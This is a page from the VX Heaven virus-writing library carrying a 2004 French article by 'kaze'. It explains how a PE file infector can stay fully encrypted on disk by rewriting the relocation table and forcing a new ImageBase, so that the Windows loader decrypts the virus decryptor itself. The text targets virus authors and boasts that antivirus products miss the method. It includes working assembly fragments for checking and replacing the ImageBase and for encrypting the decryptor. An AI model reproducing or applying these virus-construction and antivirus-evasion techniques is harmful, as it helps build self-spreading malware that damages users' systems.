<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> kaze 'Total encryption for PE infectors' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="kaze"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, kaze,Total encryption for PE infectors, reloc, header, variable, word, chunk, relocbase, delta, executable, doit, offset, relocs, dans, appliquée, section, deux"/>
<meta name="Description" content="Tres tôt, pour échapper aux scanners, les virus ont adopté une méthode de camouflage aujourd'hui très répendue: l'encryption. Cependant, aucun virus ne peut s'encrypter totalement, le décrypteur devant toujours être en clair. Enfin, ne pouvait ... :p C'est désormais possible, gr^qce à la mgie Windows. Imaginez ... votre virus est entièrement crypté sur le disque et c'est Windows, au chargement du PE, qui le décrypte à votre place. Sympa non ? Cette méthode n'est pas originale, ayant déjà été présentée dans 29A#5 par Tcp, mais très brievement, avec peu d'explications et zéro code. De plus, il me semble que cette technique n'a jamais été reutilisée dans des virii connus. J'ai donc essayé d'y remédier en apportant un exemple fonctionnel et plutot efficace (pour l'instant, aucun AV ne l'a détecté, alors qu'il reste très très simple)."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fbdd4ea37dade674014ba1e48e99c4f96a4be104-1498757785-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vkz01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Total encryption for PE infectors</h1><p><a href="/lib/?lang=fr&amp;author=kaze"> kaze</a><br/> <em> 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vkz01.html';</script>[<a style="" href="/lib/?lang=FR&amp;index=WI#vkz01">Back to index</a>] [<a href="/lib/vkz01.html#disqus_thread">Comments</a>]<br/> 
 
<ul>
<li><a href="#c0">Introduction</a></li>
<li><a href="#c1">I. Description</a></li>
<li><a href="#c2">II. Programmation</a></li>
<li><a href="#c3">III. Code Source</a></li>
<li><a href="#c4">IV. Conclusion</a></li>
</ul>
<h2><a name="c0"></a>Introduction</h2>
<p>Tres tôt, pour échapper aux scanners, les virus ont adopté une méthode de camouflage aujourd'hui très répendue: l'encryption. Cependant, aucun virus ne peut s'encrypter totalement, le décrypteur devant toujours être en clair. Enfin, ne pouvait ... :p C'est désormais possible, gr^qce à la mgie Windows. Imaginez ... votre virus est entièrement crypté sur le disque et c'est Windows, au chargement du PE, qui le décrypte à votre place. Sympa non ? Cette méthode n'est pas originale, ayant déjà été présentée dans 29A#5 par Tcp, mais très brievement, avec peu d'explications et zéro code. De plus, il me semble que cette technique n'a jamais été reutilisée dans des virii connus. J'ai donc essayé d'y remédier en apportant un exemple fonctionnel et plutot efficace (pour l'instant, aucun AV ne l'a détecté, alors qu'il reste très très simple).</p>
<p>Cet article n'est pas un tutoriel sur la programmation de PE infecteurs, il assume que vous savez coder ce type d'infecteur et que vous avez quelques bases en encryption. Si ce n'est pas le cas, allez lire le tut de rikenar. Pour les remarques ou autre, n'hésitez pas:</p>
<p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5b303a213e046b36231b223a333434753d29">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> #vxers: irc.epiknet.org</p>
<h2><a name="c1"></a>I. Description</h2>
<p>Le format PE permet de prendre en charge un mécanisme assez interessant: la relocation. Voyez plutôt: lorsqu'un executable (ou un dll) est compilé, le linkeur assume que le programme sera chargé à une certaine adresse en RAM. Pour windows, cette adresse appelée ImageBase est généralement 0x400000. 99% du temps cette adresse est disponible dans le process et les relocations n'auront pas lieu. C'est pour cela que quelques virus se recopient sur la section des relocs, étant tres rarement utilisée. Mais lorsque par exemple un executable et un dll ayant tous deux une ImageBase de 0x400000 sont chargés en RAM, ils ne peuvent être chargés tous deux à 0x400000. L'un des deux devra donc être chargé à une adresse différente, ce qui faussera alors tout son adressage. C'est le même principe que pour le delta offset:</p>
<pre>
                __________ 0x400000 _________ 
   -------------                             -------------     
   | MZ HEADER |                             | MZ HEADER |
   |-----------|                             |-----------|
   | PE HEADER |                             | PE HEADER |
   |-----------|                             |-----------|     
   |           |                             |           | 
   |           |                             |           | 
   |    EXE    |                             |    DLL    | 
   | variable1 |&lt;---  adresse variable1  --->| ........  |---? 
   | variable2 |&lt;---  adresse variable2  --->| ........  |   |  Decalage
   -------------       _______|________      |-----------|   |  
                       etablies lors de      | MZ HEADER |   |
                        la compilation       |-----------|   |
                                             | PE HEADER |   |
                                             |-----------|   |
                                             |           |   |
                                             |           |   |
                                             |    EXE    |   |
                                             | variable1 |---Ù 
                                             | variable2 |
                                             -------------
</pre>
<p>C'est pour remedier à ce problème que sont apparues les relocs. Elles se caracterisent sous forme d'une section généralement nommée ".reloc" qui est en gros une liste d'adresses pointant vers chaque dword de l'executable qui contient une adresse absolue. Si l'executable est chargé à une adresse differente de son ImageBase, alors le décalage sera appliqué à toutes les adresses absolues de cette executables. Exemple:</p>
<p>Mettons nous dans le cas d'un executable compilé avec une ImageBase de 0x400000, et qui ne peut être chargé qu'à 0x500000. Dans son code, si il y avait un:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
&nbsp;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; reloc<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">0x401009</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; B8 09 10 40 00</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;= mov eax, offset variable1</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; variable1 &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #7f007f;">'VAR1'</span><br/>
&nbsp;</div>
<p>avec offset variable1 égal à par exemple 0x401009, une relocation serait appliquée lors de son chargement sur le dword à l'emplacement reloc+1, en ajoutant 0x500000-0x400000 soit 0x100000. Ce qui donnerait finalement en memoire:</p>
<pre>
	0x500000:
	         		...   relocation ( + 0x100000 )
                                  ____|___               
        reloc:           mov eax,[0x501009]      ; B8  09 10 50 00 
                 		...                     
	                                               
        0x501009:            'VAR1'              ; "VAR1"  L'adresse est ok.
	        		...
</pre>
<p>Ainsi, bien que le code ait été chargé à une adresse non prévue par le compilateur, les relocations lui ont permis de fonctionner comme si de rien n'était, en ajoutant le décalage nécessaire à chaque adresse de l'executable. Et ce qui est intéressant, c'est que ces additions sont effectuées automatiquement au chargement de l'executable... </p>
<p>Autre chose d'encore plus interressant est que quand windows rencontre une ImageBase à laquelle il ne peut charger l'executable (par exemple &lt; 0x400000) ou >0x80000000), Windows le charge automatiquement à l'adresse 0x400000 et applique les relocs en conséquence.</p>
<p>Si l'on arrivait à modifier les relocs d'un PE pour qu'elles pointent vers chaque dword de notre decrypteur, et si l'on forçait les relocs à s'executer en changeant l'ImageBase en disons NewImageBase, que se passerait-il ? Et bien tout d'abord, au chargement de l'executable, à chaque dword de notre decrypteur serait ajoutée la valeur ImageBase-NewImageBase (il faudrait donc bien sur l'encrypter avant en otant la valeur ImageBase-NewImageBase), et quand notre virus rendrait le contrôle au PE hôte, il crasherait. Pourquoi ? Parce qu'en faisant pointer les relocs vers notre decrypteur, nous avons écrasé les anciennes relocs du PE. Et comme vu precedemment, si il est chargé à une adresse différente de son ImageBase sans relocations, son adressage devient faux: il crash.</p>
<p>Mais si l'on infectait uniquement les PE ayant une ImageBase de 0x400000 et que l'on changeait leur ImageBase en une NewImageBase à laquelle windows ne peut pas charger l'executable (par ex. &lt;0x400000), que se passerait-il ? Et bien l'executable serait chargé à l'adresse 0x400000 et les relocs seraient appliquées, et donc notre decrypteur decrypté. Mais là, le fichier ne crasherait pas vu qu'il serait chargé à son ImageBase et que ses relocs ne seraient pas appliquées, vu qu'on les a écrasé avec les notres. Voila donc ce qu'il nous reste à faire...</p>
<h2><a name="c2"></a>II. Programmation</h2>
<p>Tout d'abord, voyons comment se présentent ces relocations: Une section reloc est constituée d'une suite de "RelocChunk", chacun portant les informations de relocation pour 4k de code:</p>
<pre>
[ RELOC_CHUNK ]

	DWORD	RelocBase	;Base à partir de laquelle les relocs
				;seront appliquées.
	DWORD	RelocLen	;Taille du RELOC_CHUNK 
	WORD	Reloc1		;Une reloc. Voir plus loin ...
	WORD	Reloc2		;Une autre reloc. Voir plus loin ...
	...
</pre>
<p>La fin des relocs est marquée par un RELOC_CHUNK ayant pour Reloc_base le dword 0.</p>
<p>Une reloc en elle-même est un word, constitué comme suit: Les 4 premiers bits (MSB) représentent le type de reloc à appliquer, à savoir:</p>
<pre>RELOC_ABSOLUTE	EQU	0</pre>
<p>Pas de signification, utilisé pour aligner le RELOC_CHUNK sur 32bits.</p>
<pre>RELOC_16BITS_HIGH	EQU	1</pre>
<p>La relocation doit être appliquée sur le word de poids fort (MSB) du dword en question.</p>
<pre>RELOC_16BITS_LOW	EQU	2</pre>
<p>La relocation doit être appliquée sur le word de poids faible (LSB) du dword en question.</p>
<pre>RELOC_32BITS	EQU	3</pre>
<p>La relocation doit étre appliquée au dword, en entier.</p>
<p>Les 12 derniers bits (LSB) eux contiennent le décalage par rapport à RelocBase où la reloc doit être appliquée. D'où le fait que chaque RELOC_CHUNK ne peut adresser plus de 2^12 soit 4096 bytes. Par exemple, si vous tombez sur un RELOC_CHUNK de ce type:</p>
<pre>
	0x00001000		;RelocBase = 0x1000
	0x00000010		;Taille du RELOC_CHUNK = 16 bytes
	0x3016			;reloc
	0x2020			;reloc
	0x3088			;reloc
	0x0000			;reloc

	0x00000000		;RelocBase du RELOC_CHUNK suivant
</pre>
<p>On remarque que 3 relocations s'appliquent:</p>
<p>La premiere à l'adresse 0x1000 + 0x0016 soit à 0x1016 sur un dword</p>
<p>La deuxième à l'adresse 0x1020 sur le mot de poids faible du dword</p>
<p>La troisième à l'adresse 0x1088, sur un dword.</p>
<p>La quatrième n'indique rien, servant juste à aligner le RELOC_CHUNK sur 32bits.</p>
<p>Le RELOC_CHUNK qui suit termine la liste vu qu'il possède pour RelocBase le dword 0.</p>
<p>Maintenant que nous avons toutes les informations en main, il ne nous reste plus qu'à appliquer le tout. Voila ce qu'il devrait se passer lors de l'infection d'un fichier:</p>
<ol>
<li>Vérifier que son ImageBase est bien 0x400000, sinon exit.</li>
<li>Modifier son ImageBase en une NewImageBase à laquelle win ne pourra le charger</li>
<li>Soustraire la valeur (ImageBase-NewImageBase) à chaque dword du décrypteur</li>
<li>Si il n'y a pas de section .reloc, en creer une</li>
<li>Modifier les relocs pour qu'elles pointent vers chaque dword du décrypteur</li>
<li>Infecter le fichier</li>
<li>exit</li>
</ol>
<p>Ainsi, le virus sera entièrement crypté sur le disque, et automatiquement décrypté lors de son chargement en RAM. Plutot sympa ... Au lieu de juste crypter un décrypteur on pourrait bien sur crypter ainsi tout le virus, mais cela necessiterait une section .reloc bien plus importante... La meilleure solution à mon goût reste donc d'utiliser une encryption même simple et d'encrypter uniquement le decrypteur via cette technique.</p>
<p>A partir de maintenant, j'assumerai que votre décrypteur est de la forme:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">debut<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; delta<br/>
delta<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span>offset delta&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;calcul le delta offset</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>virus<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;esi --&gt; code à décrypter </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>virus_len<span style="color: #339933;">-</span><span style="color: black;">&#40;</span>offset virus<span style="color: #339933;">-</span>offset debut<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;taille du virus - </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;taille du decrypteur</span><br/>
encrypt<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>encrypt_val<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;simple 8bits xor encryption</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; encrypt<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; virus<br/>
<br/>
encrypt_val &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; crypteur_len&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> offset debut<span style="color: black;">&#41;</span><span style="color: #339933;">/</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;nombre de dword du </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;decrypteur + 1</span><br/>
<span style="color: #0000ff; font-weight: bold;">ALIGN</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span><br/>
virus<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;début du virus ...</span><br/>
&nbsp;</div>
<p>Il peut être différent bien sur, mais il faudrait conserver les constantes debut, virus et crypteur_len + le ALIGN DWORD.</p>
<p>Pour l' étape 1, rien de bien compliqué, il suffit de regarder à l'offset 34h du PE Header pour obtenir l'ImageBase.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;edx --&gt; PE Header du fichier en train d'être infecté</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">34h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0400000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; pasbon<br/>
&nbsp;</div>
<p>Pour l'étape 2, il va nous falloir trouver une adresse à laquelle windows ne pourra charger l'executable. Les valeurs possibles vont de 0 à 0x400000 et de 0x80000000 à 0xFFFFFFFF. Le mieux serait d'en obtenir une aléatoirement. Pour obtenir un dword aléatoire, chacun sa méthode. Moi j'ai choisi de lire le TimeStamp à l'offset 08h du PE Header. Ca nous donne un nombre différent pour chaque fichier infecteur, ce qui est largement suffisant à mon goût. Si cette valeur est à 0, alors on peut prendre comme valeur 0x100000, qui est l'ImageBase des vieilles applis windows, comme ca ca ne fera pas trop suspect.</p>
<p>Tcp nous dit que WinNT n'admet que des ImageBase multiples de 64k, donc on arrondira le résulta final sur 64k.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;edx --&gt; PE Header du fichier en train d'être infecté</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; TimeDateStamp (random...)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; hcrandom&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Si 0, valeur par défault.</span><br/>
findrandom<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">js</span>&nbsp; &nbsp; &nbsp; ncrandom&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Si &gt;= 0x80000000 c'est bon.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">400000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; ncrandom&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; si &lt; 0x400000 c'est bon aussi.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ror</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; On ror la valeur jusqu'à que ce soit bon.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; findrandom <br/>
hcrandom<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0100000h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Old windows applications ImageBase</span><br/>
ncrandom<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; NT/2000 Compatibility ?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">34h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; NewImageBase</span><br/>
&nbsp;</div>
<p>Ensuite, il nous faut encrypter notre décrypteur. Rien de bien compliqué là encore.</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;edi = Offset du virus sur le disque (pas en ram hein).</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">edi</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0400000h</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span>crypteur_len<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Ebx = ImageBase - NewImageBase</span><br/>
encryptdécrypteur<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsd</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Encrypte le decrypteur.</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosd</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; encryptdécrypteur<br/>
&nbsp;</div>
<p>Voila, c'est l'application bête et méchante de ce qui a été dit plus haut.</p>
<p>Pour l'étape 4, je ne proposerai pas de code car cela dépend énormément de votre virus. Si vous voulez des exemples, allez voir le code source. Juste quelques indices: pour savoir si une section de relocs est présente, il suffit de regarder à l'offset 0xA0 du PE Header. Vous trouverez la RVA des relocations. Si elle est égale à 0, alors il n'y a pas de relocs et il vous faudra alors creer une nouvelle section pour les y mettre. J'ai déjà essayé de mettre les relocs dans la même section que le virus, mais pour des raisons obscures que j'aimerais bien connaitre, ca n'a jamais fonctionné. L'unique solution que j'ai trouvé a été de creer une nouvelle section.</p>
